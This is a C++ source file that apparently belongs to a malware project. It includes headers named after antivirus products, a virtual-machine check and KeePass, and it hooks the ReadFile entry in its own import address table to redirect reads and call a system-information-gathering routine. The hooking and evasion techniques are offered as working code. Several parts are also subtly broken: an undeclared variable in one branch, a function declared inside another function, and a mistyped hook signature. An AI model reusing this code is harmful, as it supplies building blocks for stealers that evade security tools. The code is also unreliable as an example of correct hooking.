#include<Windows.h>
#include"SystemInfooo.h"
#include"Avira.h"
#include <iostream>
#include <stdio.h>
#include"Norton.h"
#include"Avast.h"
#include"Kaspersky.h"
#include"checkVM.h"
#include"FSecure.h"
#include <string>
#include <fstream>
#include <cassert>
#include <iomanip>
#include <iostream>
#include <vector>
#include"WinVersion.h"
#include"TrendMicro.h"
#include"WebRoot.h"
#include"BitDefender.h"
#include"MalwareBytes.h"
#include"Adaware.h"
#include"DrWeb.h"
#include"KeePass.h"
#include <iostream>
#include <fstream>
#include <Psapi.h>	
#include"BeginHooking.h"
#pragma warning (disable:26812)

VOID
WINAPI
BeginHook()
{
	//CStringA Message = "";
	//Message.Format("[*] %s: Starting the hook process\n", __FUNCTION__);
	//OutputDebugStringA(Message.GetBuffer());

	MODULEINFO ModuleInfo = { 0 };				// to be filled out by GetModuleInformation()
	HMODULE hModSelf = GetModuleHandleW(NULL);	// handle to self

	BOOL Status = K32GetModuleInformation(GetCurrentProcess(), hModSelf, &ModuleInfo, sizeof(MODULEINFO));
	if (!Status)
	{
		//ResolveErrorCode("K32GetModuleInformation: ", GetLastError());
		return;
	}

	PBYTE BaseAddress = (PBYTE)ModuleInfo.lpBaseOfDll;	// cast PVOID to PBYTE
	PIMAGE_DOS_HEADER pimgDos = (PIMAGE_DOS_HEADER)BaseAddress;		// cast the base address to proper struct to begin parsing
	PIMAGE_NT_HEADERS pimgNt = (PIMAGE_NT_HEADERS)(BaseAddress + pimgDos->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pimgOpt = (PIMAGE_OPTIONAL_HEADER) & (pimgNt->OptionalHeader);
	PIMAGE_IMPORT_DESCRIPTOR pimgImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(BaseAddress + pimgOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	for (; pimgImportDescriptor->Characteristics; pimgImportDescriptor++)
	{

		if (!_stricmp((PCHAR)(BaseAddress + pimgImportDescriptor->Name), "kernel32.dll"))
		{
			//Message.Format("[+] %s: Found the module!\n", __FUNCTION__);
			//OutputDebugStringA(Message.GetBuffer());

			break;
		}
	}

	PIMAGE_THUNK_DATA pimgOriginalFirstThunk = (PIMAGE_THUNK_DATA)(BaseAddress + pimgImportDescriptor->OriginalFirstThunk);
	PIMAGE_THUNK_DATA pimgFirstThunk = (PIMAGE_THUNK_DATA)(BaseAddress + pimgImportDescriptor->FirstThunk);
	PIMAGE_IMPORT_BY_NAME NamesArray = NULL;

	PIMAGE_THUNK_DATA INT_ = (PIMAGE_THUNK_DATA)pimgOriginalFirstThunk;	// INT is the import names table
	PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)pimgFirstThunk;			// IAT is the import address table

	for (; !(INT_->u1.Ordinal & IMAGE_ORDINAL_FLAG) && INT_->u1.AddressOfData; INT_++)
	{
		NamesArray = (PIMAGE_IMPORT_BY_NAME)(BaseAddress + INT_->u1.AddressOfData);
		if (!_stricmp("ReadFile", (PCHAR)(NamesArray->Name)))
		{
#ifdef _WIN64
			//Message.Format("\tRVA: 0x%I64X, Name: %s()\n", INT_->u1.Function, (PCHAR)(NamesArray->Name));
			//OutputDebugStringA(Message.GetBuffer());
#else
			Message.Format("\tRVA: 0x%x, Name: %s()\n", INT_->u1.Function, (PCHAR)(NamesArray->Name));
			OutputDebugStringA(Message.GetBuffer());
#endif // _WIN64

			//Message.Format("[+] %s: Found the function!\n", __FUNCTION__);
			//OutputDebugStringA(Message.GetBuffer());

			break;
		}
		IAT++;
	}


	DWORD OldProtect = 0;
	DWORD LastError = 0;

	Status = VirtualProtect((PVOID) & (IAT->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &OldProtect);
	if (!Status)
	{
		LastError = GetLastError();
		//ResolveErrorCode("VirtualProtect: ", LastError);
		//Message.Format("[!] %s: Could not change initial permissions, error: %d\n", __FUNCTION__, LastError);
		//OutputDebugStringA(Message.GetBuffer());

		return;
	}

	//Message.Format("[*] Writing over the function pointer\n");
	//OutputDebugStringA(Message.GetBuffer());
	NTSTATUS WINAPI pfnHookedReadFile(
		HANDLE       hFile,
		LPVOID       lpBuffer,
		DWORD        nNumberOfBytesToRead,
		LPDWORD      lpNumberOfBytesRead,
		LPOVERLAPPED lpOverlapped
	);

	IAT->u1.Function = (uintptr_t)pfnHookedReadFile;

	//Message.Format("[+] Successfully overwrote the function pointer\n");
	//OutputDebugStringA(Message.GetBuffer());

	DWORD OldProtect1 = 0;

	// TODO #7 - restore the former page protection to the IAT
	//
	Status = VirtualProtect((PVOID) & (IAT->u1.Function), sizeof(uintptr_t), OldProtect, &OldProtect1);
	if (!Status)
	{
		LastError = GetLastError();
		//ResolveErrorCode("VirtualProtect: ", LastError);
		//Message.Format("[!] %s: Could not restore initial permissions, error: %d\n", __FUNCTION__, LastError);
		//OutputDebugStringA(Message.GetBuffer());

		return;
	}

	CloseHandle(hModSelf);

	return;
}

typedef NTSTATUS(WINAPI* PF_READ_FILE)(
	HANDLE       hFile,
	LPVOID       lpBuffer,
	DWORD        nNumberOfBytesToRead,
	LPDWORD      lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
	);

PF_READ_FILE pfnRealReadFile = (PF_READ_FILE)GetProcAddress(GetModuleHandleA("kernel32"), "ReadFile");

// the implementation of the hooked function
//





NTSTATUS
WINAPI
pfnHookedReadFile(
	HANDLE       hFile,
	LPVOID       lpBuffer,
	DWORD        nNumberOfBytesToRead,
	LPDWORD      lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
)
{

	NTSTATUS Status = 0L;
	//CHAR Path[256];
	//GetFinalPathNameByHandleA(hFile, Path, 256, FILE_NAME_NORMALIZED | VOLUME_NAME_NT);
	OFSTRUCT lpReOpenBuff;

	HANDLE hFile2 = (HANDLE)OpenFile("C:\\Users\\analyst\\Desktop\\EEEEE.txt", &lpReOpenBuff, OF_CREATE | OF_READWRITE);
	Status = pfnRealReadFile(
		hFile2,
		lpBuffer,
		nNumberOfBytesToRead,
		lpNumberOfBytesRead,
		lpOverlapped
	);

	SystemInformationGaining();

	return Status;
}